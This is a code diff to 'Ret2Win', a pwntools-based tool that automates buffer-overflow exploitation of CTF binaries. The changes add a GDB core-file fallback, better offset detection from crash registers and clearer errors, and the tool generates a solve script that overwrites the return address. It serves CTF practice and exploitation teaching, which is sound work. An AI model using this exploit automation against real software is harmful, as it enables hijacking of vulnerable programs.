@@ -9,12 +9,27 @@ import os
 import sys
 import resource
 import glob
+import tempfile
+import subprocess
+import shutil
 from typing import Optional, Dict, Any, List, Tuple
+
+import builtins
+_orig_input = builtins.input
 
 try:
     from pwn import (
-        context, process, remote, ELF, cyclic, cyclic_find, p32, p64, log, ROP
+        context, process, remote, ELF, cyclic, cyclic_find, p32, p64, log, ROP, Corefile
     )
+    # Ensure pwntools term wrapper does not hijack sys.stdout / sys.stderr / sys.stdin / builtins.input
+    if hasattr(sys, "__stdout__") and sys.__stdout__ is not None:
+        sys.stdout = sys.__stdout__
+    if hasattr(sys, "__stderr__") and sys.__stderr__ is not None:
+        sys.stderr = sys.__stderr__
+    if hasattr(sys, "__stdin__") and sys.__stdin__ is not None:
+        sys.stdin = sys.__stdin__
+    builtins.input = _orig_input
+    builtins._orig_input = _orig_input
 except ImportError:
     print("[!] This tool requires pwntools. Install it with: pip install pwntools")
     sys.exit(1)
@@ -88,7 +103,13 @@ def _find_win_candidates(elf) -> List[Dict[str, str]]:
     candidates: List[Dict[str, str]] = []
     seen = set()
 
-    for name, addr in sorted(elf.symbols.items(), key=lambda x: x[1]):
+    # Prefer elf.functions if available to ensure only executable functions are selected (avoiding OBJECTs in .bss/.data)
+    if hasattr(elf, "functions") and elf.functions:
+        sym_items = [(name, f.address) for name, f in elf.functions.items()]
+    else:
+        sym_items = list(elf.symbols.items())
+
+    for name, addr in sorted(sym_items, key=lambda x: x[1]):
         # Guard against non-string keys (modern pwntools may have integer keys)
         if not isinstance(name, str):
             continue
@@ -117,14 +138,20 @@ def _find_win_candidates(elf) -> List[Dict[str, str]]:
     return candidates
 
 
-def clean_core_dumps():
-    """Remove leftover core dump files (e.g. core, core.12345) from working directory."""
-    for pattern in ["core", "core.[0-9]*"]:
-        for f in glob.glob(pattern):
-            try:
-                os.remove(f)
-            except OSError:
-                pass
+def clean_core_dumps(directory: Optional[str] = None):
+    """Remove leftover core dump files from working directory and binary directory."""
+    dirs = ["."]
+    if directory and os.path.abspath(directory) != os.path.abspath("."):
+        dirs.append(directory)
+    for d in dirs:
+        for pattern in ["core", "core.[0-9]*", "core.*.coredumpctl", "core.*.apport"]:
+            for f in glob.glob(os.path.join(d, pattern)):
+                if f.endswith(".py"):
+                    continue
+                try:
+                    os.remove(f)
+                except OSError:
+                    pass
 
 
 def analyze_binary(path: str) -> Dict[str, Any]:
@@ -175,6 +202,75 @@ def analyze_binary(path: str) -> Dict[str, Any]:
     }
 
 
+def _get_gdb_corefile(binary_path: str, payload: bytes, input_mode: str = "stdin", cwd: Optional[str] = None) -> Optional[Any]:
+    """
+    Fallback mechanism: Run binary under GDB to generate a core file upon crash.
+    This intercepts SIGSEGV before custom signal handlers (e.g. picoCTF challenges)
+    can catch it and call exit().
+    """
+    if not shutil.which("gdb"):
+        return None
+
+    binary_dir = cwd or os.path.dirname(os.path.abspath(binary_path)) or "."
+    fd_core, core_path = tempfile.mkstemp(prefix="ret2win_gdb_core_")
+    os.close(fd_core)
+
+    in_path = None
+    try:
+        gdb_commands = [
+            "-batch",
+            "-ex", "set debuginfod enabled off",
+            "-ex", "set pagination off",
+            "-ex", f"cd {binary_dir}",
+            "-ex", f"file {binary_path}",
+        ]
+
+        if input_mode == "stdin":
+            fd_in, in_path = tempfile.mkstemp(prefix="ret2win_in_")
+            with open(fd_in, "wb") as f:
+                f.write(payload + (b"\n" if not payload.endswith(b"\n") else b""))
+            gdb_commands.extend([
+                "-ex", f"run < {in_path}",
+                "-ex", f"generate-core-file {core_path}",
+                "-ex", "quit"
+            ])
+        elif input_mode == "argv":
+            escaped_payload = payload.decode('latin1', errors='replace').replace('"', '\\"')
+            gdb_commands.extend([
+                "-ex", f'run "{escaped_payload}"',
+                "-ex", f"generate-core-file {core_path}",
+                "-ex", "quit"
+            ])
+        else:
+            return None
+
+        subprocess.run(
+            ["gdb"] + gdb_commands,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=5.0
+        )
+
+        if os.path.isfile(core_path) and os.path.getsize(core_path) > 0:
+            with context.local(log_level='critical'):
+                return Corefile(core_path)
+    except Exception:
+        pass
+    finally:
+        if in_path and os.path.exists(in_path):
+            try:
+                os.remove(in_path)
+            except OSError:
+                pass
+        if os.path.exists(core_path):
+            try:
+                os.remove(core_path)
+            except OSError:
+                pass
+
+    return None
+
+
 def find_offset(binary_path: str, max_len: int = 2048, input_mode: str = "stdin", logger=None) -> int:
     """
     Crash the binary with a cyclic De Bruijn pattern and inspect the core dump
@@ -199,35 +295,80 @@ def find_offset(binary_path: str, max_len: int = 2048, input_mode: str = "stdin"
     context.binary = elf
     pattern = cyclic(max_len)
 
+    binary_dir = os.path.dirname(os.path.abspath(binary_path)) or "."
+    clean_core_dumps(binary_dir)
     _log(f"Launching {binary_path} with {max_len}-byte cyclic pattern...", "cyan")
 
+    timed_out = False
     # Run process
     if input_mode == "stdin":
-        p = process(binary_path)
+        p = process(binary_path, cwd=binary_dir)
         try:
             p.sendline(pattern)
             try:
                 p.wait(timeout=3.0)
             except Exception:
+                timed_out = True
                 p.kill()
         except EOFError:
             pass
     elif input_mode == "argv":
-        p = process([binary_path, pattern])
+        p = process([binary_path, pattern], cwd=binary_dir)
         try:
             p.wait(timeout=3.0)
         except Exception:
+            timed_out = True
             p.kill()
     else:
         raise ValueError(f"Unsupported input mode: {input_mode}")
 
-    core_dump = p.corefile
+    output_preview = b""
+    try:
+        output_preview = p.clean(timeout=0.2)
+    except Exception:
+        pass
+
+    poll = p.poll()
+    core_dump = None
+    if not timed_out and poll is not None and poll < 0:
+        try:
+            with context.local(log_level='critical'):
+                core_dump = p.corefile
+        except Exception:
+            pass
+
+    # GDB fallback: catches SIGSEGV directly before custom handlers (e.g. picoCTF) can exit()
     if core_dump is None:
-        raise RuntimeError(
-            "No core dump was produced. Verify core dumps are enabled "
-            "('ulimit -c unlimited') and that the binary actually crashes on this input. "
-            "Pass --offset manually if the crash mechanism is non-standard."
-        )
+        core_dump = _get_gdb_corefile(binary_path, pattern, input_mode=input_mode, cwd=binary_dir)
+
+    if core_dump is None:
+        out_msg = ""
+        if output_preview:
+            clean_text = output_preview.decode('latin1', errors='replace').strip()
+            if clean_text:
+                out_msg = f" Binary output: {clean_text[:120]}"
+
+        if timed_out or poll is None:
+            raise RuntimeError(
+                "Target binary timed out after 3.0s without crashing. "
+                "Verify input delivery mode and interaction."
+            )
+        elif poll == 0:
+            raise RuntimeError(
+                f"Target binary exited cleanly (code 0) without crashing.{out_msg} "
+                f"The pattern length of {max_len} bytes was likely too short to cause a buffer overflow, "
+                "or the binary required different preconditions/input."
+            )
+        elif poll > 0:
+            raise RuntimeError(
+                f"Target binary exited with code {poll} (no crash or core dump).{out_msg} "
+                "The binary may have failed an internal check or required specific arguments."
+            )
+        else:
+            raise RuntimeError(
+                f"Target binary crashed with signal {abs(poll)}, but no core dump was found or parsed. "
+                "Verify core dumps are enabled ('ulimit -c unlimited') or pass --offset manually."
+            )
 
     offset = -1
     detected_reg = "unknown"
@@ -244,31 +385,31 @@ def find_offset(binary_path: str, max_len: int = 2048, input_mode: str = "stdin"
             pass
 
     # Strategy 2: Check RIP / EIP
-    if offset < 0:
-        ip = core_dump.rip if elf.bits == 64 else core_dump.eip
-        if ip and ip != 0:
-            try:
-                idx = cyclic_find(ip & 0xFFFFFFFF)
-                if idx >= 0:
-                    offset = idx
-                    detected_reg = f"instruction pointer ({hex(ip)})"
-            except Exception:
-                pass
+    ip = getattr(core_dump, "rip" if elf.bits == 64 else "eip", 0)
+    if offset < 0 and ip and ip != 0:
+        try:
+            idx = cyclic_find(ip & 0xFFFFFFFF)
+            if idx >= 0:
+                offset = idx
+                detected_reg = f"instruction pointer ({hex(ip)})"
+        except Exception:
+            pass
 
     # Strategy 3: Check stack pointer (RSP / ESP)
     if offset < 0:
-        sp = core_dump.rsp if elf.bits == 64 else core_dump.esp
-        ws = elf.bytes
-        for sp_offset in [0, -ws, ws, -2 * ws, 2 * ws]:
-            try:
-                val = core_dump.read(sp + sp_offset, ws)
-                idx = cyclic_find(val[:4])
-                if idx >= 0:
-                    offset = idx
-                    detected_reg = f"stack [SP{sp_offset:+d}] ({val[:4]!r})"
-                    break
-            except Exception:
-                pass
+        sp = getattr(core_dump, "rsp" if elf.bits == 64 else "esp", 0)
+        if sp and sp != 0:
+            ws = elf.bytes
+            for sp_offset in [0, -ws, ws, -2 * ws, 2 * ws]:
+                try:
+                    val = core_dump.read(sp + sp_offset, ws)
+                    idx = cyclic_find(val[:4])
+                    if idx >= 0:
+                        offset = idx
+                        detected_reg = f"stack [SP{sp_offset:+d}] ({val[:4]!r})"
+                        break
+                except Exception:
+                    pass
 
     try:
         clean_core_dumps()
@@ -277,7 +418,7 @@ def find_offset(binary_path: str, max_len: int = 2048, input_mode: str = "stdin"
 
     if offset < 0:
         raise RuntimeError(
-            f"Could not find cyclic pattern in crash registers (fault={hex(fault_addr)}, rip={hex(core_dump.rip)}). "
+            f"Could not find cyclic pattern in crash registers (fault={hex(fault_addr)}, ip={hex(ip)}). "
             "The crash did not overwrite the instruction pointer or stack with the pattern. "
             "Increase --max-len or set --offset manually."
         )
@@ -353,7 +494,7 @@ def format_payload_breakdown(offset: int, win_addr: int, bits: int = 64, align: 
 
     payload = junk + packed_ret + packed_win
 
-    table = Table(title="🎯 Payload Anatomy Breakdown", show_header=True, header_style="bold cyan")
+    table = Table(title="[ Payload Anatomy Breakdown ]", show_header=True, header_style="bold cyan")
     table.add_column("Component", style="bold")
     table.add_column("Size", justify="right")
     table.add_column("Value", style="dim")
@@ -447,9 +588,11 @@ def generate_solve_script(binary_path: str, offset: int, win_addr: int, bits: in
         "#!/usr/bin/env python3",
         "# Generated by Ret2Win (by -Casper)",
         "# Target: " + binary_path,
+        "import os",
         "from pwn import *",
         "",
         f"binary_path = '{binary_path}'",
+        "binary_dir = os.path.dirname(os.path.abspath(binary_path)) or '.'",
         "elf = context.binary = ELF(binary_path, checksec=False)",
         "context.log_level = 'info'",
         "",
@@ -476,13 +619,13 @@ def generate_solve_script(binary_path: str, offset: int, win_addr: int, bits: in
         if input_mode == "argv":
             script_lines.extend([
                 "# Launch local process with payload as argv[1]",
-                "io = process([binary_path, payload])",
+                "io = process([binary_path, payload], cwd=binary_dir)",
                 "io.interactive()"
             ])
         else:
             script_lines.extend([
                 "# Launch local process and send payload via stdin",
-                "io = process(binary_path)",
+                "io = process(binary_path, cwd=binary_dir)",
                 "io.sendline(payload)",
                 "io.interactive()"
             ])
@@ -502,7 +645,12 @@ def get_elf_functions(path: str) -> List[Dict]:
     functions: List[Dict] = []
     seen = set()
 
-    for name, addr in sorted(elf.symbols.items(), key=lambda x: x[1]):
+    if hasattr(elf, "functions") and elf.functions:
+        sym_items = [(name, f.address) for name, f in elf.functions.items()]
+    else:
+        sym_items = list(elf.symbols.items())
+
+    for name, addr in sorted(sym_items, key=lambda x: x[1]):
         if not isinstance(name, str):
             continue
         if name.startswith("got."):
@@ -543,28 +691,45 @@ def validate_offset(binary_path: str, offset: int, input_mode: str = "stdin") ->
     marker = b"B" * (8 if bits == 64 else 4)
     payload = b"A" * max(0, offset) + marker
 
+    binary_dir = os.path.dirname(os.path.abspath(binary_path)) or "."
+    clean_core_dumps(binary_dir)
+    timed_out = False
     if input_mode == "stdin":
-        p = process(binary_path)
+        p = process(binary_path, cwd=binary_dir)
         try:
             p.sendline(payload)
             try:
                 p.wait(timeout=3.0)
             except Exception:
+                timed_out = True
                 p.kill()
         except EOFError:
             pass
     elif input_mode == "argv":
-        p = process([binary_path, payload])
+        p = process([binary_path, payload], cwd=binary_dir)
         try:
             p.wait(timeout=3.0)
         except Exception:
+            timed_out = True
             p.kill()
     else:
         return False
 
-    core_dump = p.corefile
+    poll = p.poll()
+    core_dump = None
+    if not timed_out and poll is not None and poll < 0:
+        try:
+            with context.local(log_level='critical'):
+                core_dump = p.corefile
+        except Exception:
+            pass
+
+    # GDB fallback: catches crash before custom signal handlers exit
     if core_dump is None:
-        clean_core_dumps()
+        core_dump = _get_gdb_corefile(binary_path, payload, input_mode=input_mode, cwd=binary_dir)
+
+    if core_dump is None:
+        clean_core_dumps(binary_dir)
         return False
 
     expected_num = 0x4242424242424242 if bits == 64 else 0x42424242
